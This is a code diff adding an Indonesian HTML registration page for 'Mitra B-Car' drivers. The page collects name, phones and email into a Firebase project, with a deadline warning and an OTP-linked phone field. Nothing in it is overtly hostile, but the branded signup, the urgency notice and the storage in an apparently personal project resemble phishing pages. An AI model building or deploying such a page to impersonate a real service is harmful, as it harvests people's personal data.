@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Pendaftaran Mitra B-Car</title>
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/9.22.2/firebase-database-compat.js"></script>
+  <style>
+    input[type=number]::-webkit-inner-spin-button,
+    input[type=number]::-webkit-outer-spin-button {
+      -webkit-appearance: none;
+      margin: 0;
+    }
+    input[type=number] {
+      appearance: textfield;
+      -moz-appearance: textfield;
+    }
+  </style>
+</head>
+<body class="bg-gray-50 font-sans">
+
+  <!-- Header -->
+  <div class="bg-white shadow flex items-center p-4">
+    <button onclick="history.back()" class="mr-3 text-gray-600 text-2xl">←</button>
+    <h1 class="text-xl font-semibold">Pendaftaran Mitra B-Car</h1>
+  </div>
+
+  <!-- Info box -->
+  <div class="bg-gray-100 p-4 m-4 rounded-lg flex items-start">
+    <div class="text-blue-500 text-2xl mr-3">ℹ</div>
+    <p class="text-gray-700 text-sm">
+      Mohon lengkapi data Anda sebelum <b id="deadline"></b>. Jika tidak, data Anda akan dihapus dari sistem kami. Anda tetap bisa mendaftar ulang.
+    </p>
+  </div>
+
+  <!-- Jenis kendaraan -->
+  <div class="bg-white p-4 m-4 rounded-xl shadow flex items-center justify-between">
+    <div class="flex items-center space-x-3">
+      <img src="https://cdn-icons-png.flaticon.com/512/296/296216.png" alt="Mobil" class="w-10 h-10">
+      <div>
+        <p class="font-semibold text-lg">Mobil</p>
+        <p class="text-sm text-gray-500">Mendaftar sebagai</p>
+      </div>
+    </div>
+    <button class="border border-green-600 text-green-600 rounded-full px-3 py-1 text-sm">Ganti</button>
+  </div>
+
+  <!-- Form -->
+  <form id="registerForm" class="bg-white p-4 m-4 rounded-xl shadow space-y-4">
+    <div>
+      <label class="font-semibold text-sm text-gray-700">Nama Lengkap <span class="text-red-500">*</span></label>
+      <input type="text" id="nama" placeholder="Cth: Adit Suradit" required
+        class="w-full border-b-2 border-gray-300 focus:border-green-600 p-2 outline-none mt-1">
+      <p class="text-xs text-gray-500 mt-1">Harap isi dengan nama sesuai KTP.</p>
+    </div>
+
+    <div>
+      <label class="font-semibold text-sm text-gray-700">Nomor HP utama</label>
+      <div class="flex items-center border-b-2 border-gray-300 focus-within:border-green-600 mt-1">
+        <span class="px-2 text-gray-600">+62</span>
+        <input type="number" id="nohp" placeholder="82313270196" required
+          class="flex-1 p-2 outline-none" readonly>
+      </div>
+    </div>
+
+    <div>
+      <label class="font-semibold text-sm text-gray-700">Nomor telepon darurat</label>
+      <div class="flex items-center border-b-2 border-gray-300 focus-within:border-green-600 mt-1">
+        <span class="px-2 text-gray-600">+62</span>
+        <input type="number" id="darurat" placeholder="81212000000" required
+          class="flex-1 p-2 outline-none">
+      </div>
+      <p class="text-xs text-gray-500 mt-1">Untuk hubungi Anda jika no. HP utama tidak aktif.</p>
+    </div>
+
+    <div>
+      <label class="font-semibold text-sm text-gray-700">Alamat Email <span class="text-red-500">*</span></label>
+      <input type="email" id="email" placeholder="Cth: email@mail.com" required
+        class="w-full border-b-2 border-gray-300 focus:border-green-600 p-2 outline-none mt-1">
+    </div>
+
+    <button type="submit" class="w-full bg-green-600 text-white font-semibold py-3 rounded-full hover:bg-green-700">
+      Lanjut
+    </button>
+  </form>
+
+  <script>
+    // Firebase Config
+    const firebaseConfig = {
+      apiKey: "AIzaSyD3FQbFF5a91MlASpqImTMmGkYvaTcdxm0",
+      authDomain: "kadek-ed34e.firebaseapp.com",
+      databaseURL: "https://kadek-ed34e-default-rtdb.firebaseio.com",
+      projectId: "kadek-ed34e",
+      storageBucket: "kadek-ed34e.firebasestorage.app",
+      messagingSenderId: "65756136303",
+      appId: "1:65756136303:web:6dbe5bc658fadb05ca1e9a",
+      measurementId: "G-5WSR57JC7V"
+    };
+
+    // Init Firebase
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.database();
+
+    // Nomor HP utama otomatis
+    const userHP = "81234567890"; // Contoh nomor dari OTP
+    document.getElementById('nohp').value = userHP;
+
+    // Hitung tanggal akhir otomatis 20 hari kerja
+    function hitungDeadline() {
+      let today = new Date();
+      let added = 0;
+      while (added < 20) {
+        today.setDate(today.getDate() + 1);
+        const day = today.getDay();
+        if (day !== 0 && day !== 6) added++;
+      }
+      const options = { day: '2-digit', month: 'short', year: 'numeric' };
+      document.getElementById('deadline').textContent = today.toLocaleDateString('id-ID', options);
+    }
+    hitungDeadline();
+
+    // Submit form → simpan & buka halaman baru
+    document.getElementById('registerForm').addEventListener('submit', (e) => {
+      e.preventDefault();
+
+      const nama = document.getElementById('nama').value.trim();
+      const nohp = document.getElementById('nohp').value.trim();
+      const darurat = document.getElementById('darurat').value.trim();
+      const email = document.getElementById('email').value.trim();
+
+      if (!nama || !nohp || !darurat || !email) {
+        alert("Semua kolom wajib diisi!");
+        return;
+      }
+
+      const data = {
+        namaLengkap: nama,
+        noHpUtama: "+62" + nohp,
+        noDarurat: "+62" + darurat,
+        email,
+        kendaraan: "Mobil",
+        tanggalDaftar: new Date().toLocaleString()
+      };
+
+      db.ref('pendaftaran_mitra').push(data)
+        .then(() => {
+          // Buka halaman baru setelah submit
+          window.location.href = "halaman-berikutnya.html"; // ganti dengan URL tujuan
+        })
+        .catch((err) => {
+          alert("Gagal menyimpan data: " + err.message);
+        });
+    });
+  </script>
+
+</body>
+</html>
